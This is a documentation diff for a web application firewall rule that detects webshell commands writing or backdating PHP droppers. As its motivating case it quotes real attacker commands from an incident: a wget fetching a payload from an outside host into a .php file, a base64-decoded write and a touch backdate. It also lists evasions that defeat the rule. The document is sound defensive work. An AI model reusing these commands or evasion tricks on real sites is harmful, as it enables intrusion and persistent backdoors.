@@ -1065,6 +1065,12 @@ Current assignments:
                                                                     expected noise: other apps' admin areas
                                                                     (OpenCart, PrestaShop, Drupal, WHMCS tickets); runs after
                                                                     the 421-439 scanners so it never takes their headline)
+                                       331  rule_shell_write_exec   (logonly, 2026-10-27: a shell command in the args OR body
+                                                                    that writes an executable file — wget/curl output, a
+                                                                    > / >> redirect or a tee, to .php*/.phtml/.phar/.inc/
+                                                                    .htaccess/.user.ini — or backdates one with touch -d/-t/-r; the
+                                                                    tophair.gr webshell terminal's commands, which 310-317
+                                                                    (query string only) never saw. See "Rule 331" below)
 
 4xx — Upload / malware
   401  rule_upload_filename            405  rule_script_obfuscation
@@ -1327,6 +1333,103 @@ The detector checks base64 first, so a base64 opener is attributed to **438** an
 Rules 430-436 default to `logonly`; **437 and 438 default to `challenge`** (see their FP notes above). Operators tune per the standard playbook (one week of hit-rate data → promote to `challenge`, one more week → promote to `block`). Per-vhost exclusions apply normally: `cfm webtop waf exclude add /path/here --rule 430`.
 
 ---
+
+## Rule 331 — `rule_shell_write_exec` (a webshell terminal writing a dropper)
+
+Reason family **`WAF_RCE`**, logonly, reasons `WAF_RCE:SHELL_FETCH_TO_EXEC`,
+`WAF_RCE:SHELL_REDIRECT_TO_EXEC` and `WAF_RCE:SHELL_TOUCH_BACKDATE`.
+
+The tophair.gr backdoor (2026-10-08) was a WPCode snippet serving a file
+manager and a terminal at `/?dark&term=1`. Its commands came as a form field
+in a POST body:
+- `wget -q https://kaye1337.pages.dev/stfu/m.jpg -O wp-admin/css/colors/midnight/colors.php`
+- `curl -o … .php`
+- `echo <base64> | base64 -d > upgrade.php`
+- `touch -d '2025-07-10 20:39' g.php`, to make the dropper look a year old.
+
+Rules 310-317 read the query string only, so a replay matched nothing.
+
+The rule reads the decoded, lowercased args and body (`get_norm_ab`: query,
+urlencoded, JSON and multipart values alike). It fires on a command at a
+command position:
+- the start of a value (`=`);
+- after `;`, `|`, `&`, a backtick, `$(` or a newline;
+- inside a JSON value (a quote after `:`, `[` or `,`) or `sh -c '…'`; a JSON
+  `\n` opens a command too.
+
+The raw surface is read as the shell would, with JSON's escapes. A JSON `\n`
+or `\r` ends a command, `\t` is a blank and `\"…\"` is a quoted string. A
+quote that closes the value the command sits in ends the command: a JSON
+string, a form field, or `sh -c '…'`. That is a quote followed by `,`, `}`,
+`]`, `:`, `&` or the end, or one with no closing quote. A second command in
+the same value is read on its own.
+
+The verb may sit behind an absolute path ending in `bin/` (`/usr/bin/wget`)
+or up to three prefix words: `sudo`, `nohup`, `env`, `exec`, `command`,
+`busybox`, `nice`, `time`, `xargs`, or an assignment (`HOME=/tmp wget`, never
+a form field's own `name=` at the start or after `&`). A bare `:` or `(`
+(`usage: echo …`) is prose, and a quote after anything else is markup
+(`class="cat"`). The command must do one of
+three things:
+
+| Tag | Command |
+|---|---|
+| `FETCH_TO_EXEC` | `wget` / `curl` whose output goes to an executable name. The output is `-O` / `-o` (alone or closing a flag cluster such as `-qO`, `-sSLo`), `--output`, `--output-document[=]` or `-ox.php`, or the URL's own file name: `curl -O` / `--remote-name`, and `wget` with no output option (not `--spider` / `--delete-after`). That name is the URL path's last segment, with no query: wget keeps the query in the name (`wp-cron.php?doing_wp_cron`). `-O -` is stdout (the `wget -q -O - …/wp-cron.php` cron line), not a file. |
+| `REDIRECT_TO_EXEC` | `echo` / `printf` / `cat` / `base64` / `xxd` / `wget` / `curl` / `perl` / `python[3]` / `php` / `openssl` / `gzip` / `gunzip` with a `>`, `>>`, `>\|`, `&>` or `&>>` to an executable name, or `tee [-a]` of one after a pipe (`… \| base64 -d \| tee x.php`). |
+| `TOUCH_BACKDATE` | `touch` with `-d` / `-t` / `-r` (or a cluster carrying one), `--date` or `--reference` before its first operand (`--` ends the options). |
+
+Executable names are rule 401's PHP set (`_cve_sfl_has_exec_ext`: `.php`,
+`.php[0-9]*` such as the MultiPHP `.php74`, `.phtm[l]`, `.pht`, `.phar`), plus
+`.inc`, `.htaccess` and `.user.ini`. Only the last extension counts:
+`x.php.txt` is not run. The command is read quote-aware: a `;`
+inside quotes does not end it, and quotes are stripped from file names.
+
+**Why logonly.** Form values never carry these commands, but a tutorial pasted
+into a support ticket or a blog comment can, and so can staff saving a how-to
+post. Unlike 330 the rule has no logged-in / `/wp-admin/` exemption: a dropper
+like colors.php lives under `/wp-admin/`, and the attacker who planted it holds
+an admin cookie. That staff noise is expected in the burn-in review. Run over
+the query strings of titan's access logs (2026-10-27: 1 263 vhosts, 2.03 M
+requests with a query), it logged none; bodies are not in those logs. The
+family `WAF_RCE` is autoblock-armed for block hits only, so a 331 hit never
+bans. Promote it after
+a clean hit-rate review (`### Promoting a rule`).
+
+**Cost.** The verbs are found with plain finds, and each hit is judged by
+the byte before it. A class-pattern scan of the whole surface costs ~20 ns a
+byte in LuaJIT, about 400 µs on a 19 KB body. A body that names no
+executable file (`.ph`, `.inc`, `.htaccess`, `.user.ini`) reads `touch` alone,
+and returns after five plain finds when it has no `touch` either. The surface
+is read in place, never copied. Every read-back from a verb is bounded, and
+a verb's scan skips the occurrences inside the command it last parsed, so
+the cost is linear in the body. A command is read for at most 4 KB, 32 words
+and 256 special bytes (a quoted payload is one word and one step), and each
+verb parses at most 64 commands a request. Measured alone on
+a dev box:
+- under 1 µs on small requests, on 14 KB form posts and on 19 KB of prose
+  that names no executable file;
+- about 100-160 µs on 19 KB of prose, JSON or markup naming `.php` and a verb
+  on every line;
+- about 0.1-1.5 ms on a 32 KB body built for it: repeated `/touch`,
+  `sudo wget`, `=wget -x`, backslash runs, JSON values, assignments, pipes
+  (up to 4 s before these bounds).
+
+A 19 KB body already costs `check()` about 5 ms, a 32 KB one about 10 ms.
+
+**Limits.**
+- A command is read for 4 KB, 32 words and 256 special bytes, and each verb
+  parses 64 commands. A real command placed behind 64 decoy commands of the
+  same verb is not read. Decoys of other verbs don't hide it.
+- The surface is lowercased, so wget's `-o` (log file) reads as `-O`
+  (output). `wget -o log.txt URL/x.php` counts as an output and hides the
+  download under the URL's name.
+- Shell tricks that hide the verb or the name defeat it: `w''get`, `$x`, `${IFS}`,
+  a relative path to the verb (`./wget`), a name built at run time, `cp` / `mv`
+  of a fetched file, a prefix outside the list above.
+- PHP's own writers (`file_put_contents`) are not shell commands: rules
+  404/433-436 judge PHP source.
+
+Tests: `scripts/tests/cfm_waf_shell_write_exec_test.lua`.
 
 ## Rule 501 — `rule_auth_burst` (login submissions)
 
